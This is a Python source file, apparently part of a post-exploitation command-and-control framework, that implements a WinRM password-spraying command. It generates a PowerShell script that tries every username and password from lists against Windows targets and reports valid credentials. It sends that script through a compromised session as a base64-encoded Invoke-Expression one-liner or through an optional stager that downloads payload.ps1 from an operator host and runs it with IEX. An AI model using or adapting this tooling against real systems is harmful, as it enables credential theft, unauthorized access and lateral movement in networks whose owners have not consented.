import sys
import os
import subprocess
import base64
import argparse

from core.gunnershell.commands.base import register, Command
from core import stager_server as stage
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen  = "\001" + Style.BRIGHT + Fore.GREEN  + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred    = "\001" + Style.BRIGHT + Fore.RED    + "\002"

@register("netexec winrm", "nxc winrm")
class NetexecWinrmCommand(Command):
	"""WinRM spray against multiple targets"""

	@property
	def help(self):
		return "netexec winrm -u <userfile> -p <passfile> -d <domain> -t <targets> [flags]    WinRM spray"

	def execute(self, args):
		parser = argparse.ArgumentParser(prog="netexec_winrm", add_help=False)
		parser.add_argument('-u','--users',  dest='userfile', required=True, help='Username or file')
		parser.add_argument('-p','--passes', dest='passfile', required=True, help='Password or file')
		parser.add_argument('-d','--domain', dest='domain',   required=True, help='AD domain name')
		parser.add_argument('-t','--targets',dest='targets',  required=True, help='Targets list')
		parser.add_argument('--port',       type=int, dest='port', help='WinRM port (5985/5986)')
		parser.add_argument('--https',      action='store_true', dest='use_https', help='Use HTTPS (default port 5986)')
		parser.add_argument('--sleep-seconds', type=int, dest='sleep_seconds', default=0, help='Seconds between attempts')
		parser.add_argument('--sleep-minutes', type=int, dest='sleep_minutes', default=0, help='Minutes between attempts')
		parser.add_argument('--debug',      action='store_true', dest='debug', help='Enable verbose output')
		parser.add_argument('--stager',      action='store_true', dest='stager', help='Download & execute payload.ps1')
		parser.add_argument('--stager-port', dest='stager_port', type=int, default=8000, help='HTTP stager port (default:8000)')
		parser.add_argument('--stager-ip',   dest='stager_ip', help='IP to fetch stager payload from')

		try:
			opts = parser.parse_args(args)
		except SystemExit:
			print(brightyellow + self.help)
			return

		out = self.logic(
			self.gs.sid,
			opts.userfile,
			opts.passfile,
			opts.domain,
			opts.targets,
			port         = opts.port,
			use_https    = opts.use_https,
			sleep_seconds= opts.sleep_seconds,
			sleep_minutes= opts.sleep_minutes,
			debug        = opts.debug,
			stager       = opts.stager,
			stage_ip     = opts.stager_ip,
			stage_port   = opts.stager_port,
			op_id        = self.op_id
		)

		if out:
			print(brightgreen + out if "[!]" not in out else out)
		else:
			print(brightyellow + "[*] No output")

	def logic(self, sid, userfile, passfile, domain, targets, port=None, use_https=False, sleep_seconds=0, sleep_minutes=0, debug=False, stager=False, stage_ip=None, stage_port=8000, op_id="console"):
		# 1) load users
		if os.path.isfile(userfile):
			with open(userfile, 'r') as f:
				users = [u.strip() for u in f if u.strip()]
		else:
			users = [userfile]

		# 2) load passes
		if os.path.isfile(passfile):
			with open(passfile, 'r') as f:
				passes = [p.strip() for p in f if p.strip()]
		else:
			passes = [passfile]

		# 3) format PS arrays & target list
		users_ps   = "@(" + ",".join(f"'{u}'" for u in users) + ")"
		passes_ps  = "@(" + ",".join(f"'{p}'" for p in passes) + ")"
		targets_ps = "@(" + ",".join(f"'{t.strip()}'" for t in targets.split(',')) + ")"

		# 4) choose port
		if port:
			port = port

		else:
			if use_https:
				port = 5986

			else:
				port = 5985

		if not port:
			return brightred + "[!] Unable to determine port!"

		if use_https:
			prefix = "https"

		else:
			prefix = "http"

		ps = f"""
$Users        = {users_ps}
$Passes       = {passes_ps}
$Domain       = '{domain}'
$Targets      = {targets_ps}
$Port         = {port}
$Protocol     = '{prefix}'
$SleepSeconds = {sleep_seconds}
$SleepMinutes = {sleep_minutes}

#Write-output "[DEBUG] Starting Invoke-Command WinRM spray"

foreach ($T in $Targets) {{
  #Write-output "[DEBUG] Target: $T"
  #Write-output "[DEBUG] Resolving DNS name for $T"
  try {{
	$name = [System.Net.Dns]::GetHostEntry($T).HostName
  }} catch {{
	$name = $T
  }}
  #Write-output "[DEBUG] Resolved name: $name"

  foreach ($U in $Users) {{
	#Write-output "[DEBUG] User: $U"

	foreach ($P in $Passes) {{
	  #Write-output "[DEBUG] PASS: $P"

	  # throttle
	  if ($SleepSeconds -gt 0) {{
		#Write-Output "[DEBUG] Sleeping $SleepSeconds seconds"
		Start-Sleep -Seconds $SleepSeconds
	  }} elseif ($SleepMinutes -gt 0) {{
		#Write-Output "[DEBUG] Sleeping $SleepMinutes minutes"
		Start-Sleep -Minutes $SleepMinutes
	  }}

	  try {{
		#Write-Host "[DEBUG] Trying Invoke-Command for ${{U}}:$P"
		$sec  = ConvertTo-SecureString $P -AsPlainText -Force
		$cred = New-Object System.Management.Automation.PSCredential("$Domain\\$U", $sec)

		if ($Protocol -eq 'https') {{
		  Invoke-Command -ComputerName $name -Port $Port -Authentication Negotiate -UseSSL -Credential $cred -ScriptBlock {{ hostname }} -ErrorAction Stop | Out-Null
		}} else {{
		  Invoke-Command -ComputerName $name -Port $Port -Credential $cred -Authentication Negotiate -ScriptBlock {{ hostname }} -ErrorAction Stop | Out-Null
		}}

		#Write-Host "TEST"
		Write-Output ("WINRM       {{0,-15}} [+] {{1}}\\{{2}}:{{3}}" -f $name, $Domain, $U, $P) | Out-String
	  }} catch {{
		Write-Output "[DEBUG] Invoke-Command failed for ${{U}}:$P → $($_.Exception.Message)"
	  }}
	}}
  }}
}}
"""

		# 6) b64‑encode & dispatch
		b64 = base64.b64encode(ps.encode('utf-16le')).decode()
		one_liner = (
			"$ps = [System.Text.Encoding]::Unicode"
			f".GetString([Convert]::FromBase64String(\"{b64}\")); "
			"Invoke-Expression $ps"
		)

		sess = session_manager.sessions.get(sid)
		if not sess:
			return brightred + "[!] Invalid session"

		transport = sess.transport.lower()

		if stager:
			u = f"http://{stage_ip}:{stage_port}/payload.ps1"
			ps_cmd = (
				f"$u='{u}';"
				"$xml=New-Object -ComObject 'MSXML2.ServerXMLHTTP.6.0';"
				"$xml.open('GET',$u,$false);"
				"$xml.send();"
				"IEX $xml.responseText"
			)

			stage.start_stager_server(stage_port, ps)

			if transport in ("http", "https"):
				out = http_exec.run_command_http(sid, ps_cmd, op_id=op_id)

			elif transport in ("tcp", "tls"):
				out = tcp_exec.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)

			else:
				return brightred + "[!] Unknown session transport!"

		else:
			if transport in ("http", "https"):
				out = http_exec.run_command_http(sid, one_liner, op_id=op_id)

			elif transport in ("tcp", "tls"):
				out = tcp_exec.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)

			else:
				return brightred + "[!] Unknown transport detected!"

		if out:
			if "WINRM" in out:
				winrm_lines = [line for line in out.splitlines() if line.startswith("WINRM")]
				if winrm_lines:
					return "\n".join(winrm_lines)

			else:
				if debug:
					return out

				else:
					return brightred + "[!] No valid WinRM creds found"

		else:
			if debug:
				return out

			else:
				return brightred + "[!] No valid WinRM creds found"

